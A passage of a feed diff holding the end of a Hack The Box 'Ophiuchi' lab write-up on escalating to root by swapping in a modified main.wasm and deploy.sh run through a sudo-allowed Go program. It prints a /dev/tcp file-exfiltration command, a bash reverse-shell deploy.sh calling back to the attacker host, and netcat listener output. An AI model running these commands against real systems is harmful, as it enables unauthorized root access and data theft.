-        <span class="nx">instance</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">NewInstance</span><span class="p">(</span><span class="nx">bytes</span><span class="p">)</span>
-        <span class="k">defer</span> <span class="nx">instance</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
-        <span class="nx">init</span> <span class="o">:=</span> <span class="nx">instance</span><span class="p">.</span><span class="nx">Exports</span><span class="p">[</span><span class="s">&#34;info&#34;</span><span class="p">]</span>
-        <span class="nx">result</span><span class="p">,</span><span class="nx">_</span> <span class="o">:=</span> <span class="nf">init</span><span class="p">()</span>
-        <span class="nx">f</span> <span class="o">:=</span> <span class="nx">result</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nx">f</span> <span class="o">!=</span> <span class="s">&#34;1&#34;</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Not ready to deploy&#34;</span><span class="p">)</span>
-        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Ready to deploy&#34;</span><span class="p">)</span>
-                <span class="nx">out</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="s">&#34;deploy.sh&#34;</span><span class="p">).</span><span class="nf">Output</span><span class="p">()</span>
-                <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-                        <span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
-                <span class="p">}</span>
-                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">))</span>
-        <span class="p">}</span>
-<span class="p">}</span>
-
-</code></pre></div><p>Also, it&rsquo;s important to note that this <code>index.go</code> loads  <code>deploy.sh</code> and <code>main.wasm</code> with relative path. The <code>deploy.sh</code> and <code>main.wasm</code> themself can be found under <code>/opt/wasms-functions</code> directory.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt/wasm-functions$ ls -lah
-total 3.9M
-drwxr-xr-x <span class="m">3</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> .
-drwxr-xr-x <span class="m">5</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> ..
-drwxr-xr-x <span class="m">2</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> backup
--rw-r--r-- <span class="m">1</span> root root   <span class="m">88</span> Oct <span class="m">14</span>  <span class="m">2020</span> deploy.sh
--rwxr-xr-x <span class="m">1</span> root root 2.5M Oct <span class="m">14</span>  <span class="m">2020</span> index
--rw-rw-r-- <span class="m">1</span> root root  <span class="m">522</span> Oct <span class="m">14</span>  <span class="m">2020</span> index.go
--rwxrwxr-x <span class="m">1</span> root root 1.5M Oct <span class="m">14</span>  <span class="m">2020</span> main.wasm
-</code></pre></div><p>The <code>deploy.sh</code> contains a to-do note of a lazy admin.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
-<span class="c1">#!/bin/bash</span>
-
-<span class="c1"># ToDo</span>
-<span class="c1"># Create script to automatic deploy our new web at tomcat port 8080</span>
-</code></pre></div><p>From here, I will exfil the entire <code>/opt/wasm-functions/</code> to my machine.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt$ tar -czvf /tmp/wasm-functions.tar.gz wasm-functions/
-wasm-functions/
-wasm-functions/index
-wasm-functions/index.go
-wasm-functions/deploy.sh
-wasm-functions/main.wasm
-wasm-functions/backup/
-wasm-functions/backup/index.go
-wasm-functions/backup/deploy.sh
-wasm-functions/backup/main.wasm
-admin@ophiuchi:/opt$ cat /tmp/wasm-functions.tar.gz &gt; /dev/tcp/10.10.14.23/53
-</code></pre></div><p>On my listener:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ nc -nvlp <span class="m">53</span> &gt; wasm-functions.tar.gz
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
-connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">45380</span>
-</code></pre></div><h4 id="reversing-mainwasm">Reversing main.wasm</h4>
-<p>Now I need to find out the content of <code>main.wasm</code>. Fortunately there is a tool to {de,re}compile a wasm file, called <a href="https://github.com/WebAssembly/wabt/">wabt</a>. I will clone the repo and make the tool available to system-wide.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz -O /opt/
-$ tar -xvf /opt/wabt-1.0.23-ubuntu.tar.gz
-$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34;/opt/wabt-1.0.23/bin&#34;</span>:<span class="nv">$PATH</span>
-</code></pre></div><p>I will decompile the <code>main.wasm</code> using <code>wasm-decompile</code>. It shows that the <code>info</code> function has return value of 0.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «wasm-functions» «10.10.14.23» 
-$ wasm-decompile main.wasm 
-<span class="nb">export</span> memory memory<span class="o">(</span>initial: 16, max: 0<span class="o">)</span><span class="p">;</span>
-
-global g_a:int <span class="o">=</span> 1048576<span class="p">;</span>
-<span class="nb">export</span> global data_end:int <span class="o">=</span> 1048576<span class="p">;</span>
-<span class="nb">export</span> global heap_base:int <span class="o">=</span> 1048576<span class="p">;</span>
-
-table T_a:funcref<span class="o">(</span>min: 1, max: 1<span class="o">)</span><span class="p">;</span>
-
-<span class="nb">export</span> <span class="k">function</span> info<span class="o">()</span>:int <span class="o">{</span>
-  <span class="k">return</span> <span class="m">0</span>
-<span class="o">}</span>
-</code></pre></div><h4 id="exploitation">Exploitation</h4>
-<p>Since I need a return value of 1, so that <code>index.go</code> will execute the <code>deploy.sh</code>, I will create my own <code>main.wasm</code> file from the exfiltrated <code>main.wasm</code> using <code>wasm2wat</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ wasm2wat ../loot/wasm-functions/main.wasm <span class="p">|</span> tee main.wat
-<span class="o">(</span>module
-  <span class="o">(</span><span class="nb">type</span> <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>func <span class="o">(</span>result i32<span class="o">)))</span>
-  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
-    i32.const 0<span class="o">)</span>
-  <span class="o">(</span>table <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="m">1</span> <span class="m">1</span> funcref<span class="o">)</span>
-  <span class="o">(</span>memory <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 16<span class="o">)</span>
-  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>mut i32<span class="o">)</span> <span class="o">(</span>i32.const 1048576<span class="o">))</span>
-  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>1<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
-  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>2<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
-  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;memory&#34;</span> <span class="o">(</span>memory 0<span class="o">))</span>
-  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;info&#34;</span> <span class="o">(</span>func <span class="nv">$info</span><span class="o">))</span>
-  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__data_end&#34;</span> <span class="o">(</span>global 1<span class="o">))</span>
-  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__heap_base&#34;</span> <span class="o">(</span>global 2<span class="o">)))</span>
-</code></pre></div><p>Then I will modify the return value of the info function to 1.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...<span class="o">[</span>SNIP<span class="o">]</span>...
-  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
-    i32.const 1<span class="o">)</span>
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><p>I will compile the <code>main.wat</code> back to <code>main.wasm</code> using <code>wat2wasm</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ wat2wasm main.wat 
-</code></pre></div><p>Then I will create my own <code>deploy.sh</code> that contains a reverse shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ cat deploy.sh 
-<span class="c1">#!/bin/sh</span>
-bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.23/53 0&gt;&amp;1&#34;</span>
-</code></pre></div><p>I will transfer my <code>main.wasm</code> and <code>deploy.sh</code> using <code>scp</code> to<code>/tmp/</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ scp main.wasm deploy.sh  admin@10.10.10.227:/tmp
-admin@10.10.10.227<span class="err">&#39;</span>s password: 
-main.wasm                                                                                   100%  <span class="m">112</span>     1.7KB/s   00:00    
-deploy.sh                                                                                   100%   <span class="m">60</span>     1.1KB/s   00:00 
-</code></pre></div><p>Finally, I will setup a netcat listener and run the allowed sudo command on the <code>/tmp/</code> directory.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
-</code></pre></div><p>Now I have a root shell on my listener.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ nc -nvlp <span class="m">53</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
-connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">45382</span>
-root@ophiuchi:/tmp# id
-id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-root@ophiuchi:/tmp# 
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210729230638797.png" alt="image-20210729230638797"  /></div>
-</p>
-<hr>
-<h2 id="references">Reference(s)</h2>
-<ul>
-<li>
-<p><a href="https://www.baeldung.com/java-snake-yaml">https://www.baeldung.com/java-snake-yaml</a></p>
-</li>
-<li>
-<p><a href="https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html">https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html</a></p>
-</li>
-<li>
-<p><a href="https://webassembly.github.io/wabt/">https://webassembly.github.io/wabt/</a></p>
-</li>
 </ul>
 ]]></content:encoded>
     </item>
